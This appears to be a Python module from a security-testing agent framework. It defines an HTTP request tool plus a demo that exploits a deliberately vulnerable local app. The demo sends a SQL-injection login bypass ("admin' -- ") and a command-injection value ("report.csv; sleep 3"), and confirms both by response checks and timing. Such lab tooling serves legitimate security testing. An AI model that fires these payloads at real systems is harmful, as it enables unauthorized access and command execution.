"""Direct HTTP client tool. Most of vulnshop's exploitation is plain HTTP — no need to
route everything through a browser. stdlib urllib is enough here; httpx shows up later
(M6/M7) once the RPC shim and proxy replay need its async/proxy ergonomics.
"""
from __future__ import annotations

import json as json_module
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from pathlib import Path

from docket.tools.output_store import bound

DEFAULT_PROXY_URL = "http://127.0.0.1:8080"


def do_http_request(
    method: str,
    url: str,
    run_dir: Path,
    *,
    headers: dict | None = None,
    params: dict | None = None,
    data: str | dict | None = None,
    json: dict | None = None,
    cookies: dict | None = None,
    follow_redirects: bool = True,
    timeout_sec: int = 15,
    via_proxy: bool = False,
) -> dict:
    """Params/return shape match the tool contract in the delivery-layer design.
    `data` as a dict is form-urlencoded — matches Flask's `request.form.get(...)`
    exactly, which is what vulnshop's /login reads."""
    if params:
        url = f"{url}{'&' if '?' in url else '?'}{urllib.parse.urlencode(params)}"

    body_bytes: bytes | None = None
    req_headers = dict(headers or {})
    if json is not None:
        body_bytes = json_module.dumps(json).encode()
        req_headers.setdefault("Content-Type", "application/json")
    elif isinstance(data, dict):
        body_bytes = urllib.parse.urlencode(data).encode()
        req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif isinstance(data, str):
        body_bytes = data.encode()

    if cookies:
        req_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

    request = urllib.request.Request(url, data=body_bytes, headers=req_headers, method=method.upper())

    opener_handlers = [urllib.request.HTTPCookieProcessor(CookieJar())]
    if not follow_redirects:
        opener_handlers.append(_NoRedirect())
    if via_proxy:
        opener_handlers.append(urllib.request.ProxyHandler({"http": DEFAULT_PROXY_URL, "https": DEFAULT_PROXY_URL}))
    opener = urllib.request.build_opener(*opener_handlers)

    start = time.monotonic()
    try:
        with opener.open(request, timeout=timeout_sec) as resp:
            status_code = resp.status
            resp_headers = dict(resp.headers)
            body = resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        status_code = exc.code
        resp_headers = dict(exc.headers or {})
        body = exc.read().decode(errors="replace")
    elapsed_ms = int((time.monotonic() - start) * 1000)

    bounded = bound(body, run_dir)
    return {
        "status_code": status_code,
        "headers": resp_headers,
        "body": bounded["text"],
        "truncated": bounded["truncated"],
        "body_ref": bounded["ref"],
        "elapsed_ms": elapsed_ms,
        "flow_id": None,  # populated once the proxy tool (M7) is in the loop
    }


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def demo() -> None:
    """Proves V1 (SQLi auth bypass) and V2 (command injection) are exploitable through
    this tool alone, no LLM/Docker involved. Requires vulnshop running at :5000."""
    import shutil
    import tempfile

    tmp = Path(tempfile.mkdtemp())
    try:
        # V1 — auth-bypass SQLi against a seeded admin/admin123 user with wrong password.
        bypass = do_http_request(
            "POST", "http://127.0.0.1:5000/login", tmp,
            data={"username": "admin' -- ", "password": "definitely-wrong"},
        )
        legit_wrong = do_http_request(
            "POST", "http://127.0.0.1:5000/login", tmp,
            data={"username": "admin", "password": "definitely-wrong"},
        )
        assert bypass["status_code"] == 200 and "Welcome" in bypass["body"], bypass
        assert legit_wrong["status_code"] == 401, legit_wrong

        # V2 — command injection via `os.system("cat exports/" + filename)`. The
        # response is always the literal string "Export started" regardless of what
        # the injected command does (os.system's stdout goes to the server process,
        # not the HTTP response) — this is *blind* command injection, so the real
        # proof technique is a timing side-channel: inject a `sleep` and show the
        # response takes measurably longer, not string-matching a response body.
        baseline = do_http_request("GET", "http://127.0.0.1:5000/export", tmp, params={"file": "report.csv"})
        injected = do_http_request(
            "GET", "http://127.0.0.1:5000/export", tmp,
            params={"file": "report.csv; sleep 3"},
        )
        assert baseline["status_code"] == 200 and injected["status_code"] == 200
        assert injected["elapsed_ms"] - baseline["elapsed_ms"] > 2500, (baseline, injected)
    finally:
        shutil.rmtree(tmp)
    print("http_request: ok (V1 auth-bypass + V2 command-injection both confirmed live)")


if __name__ == "__main__":
    demo()
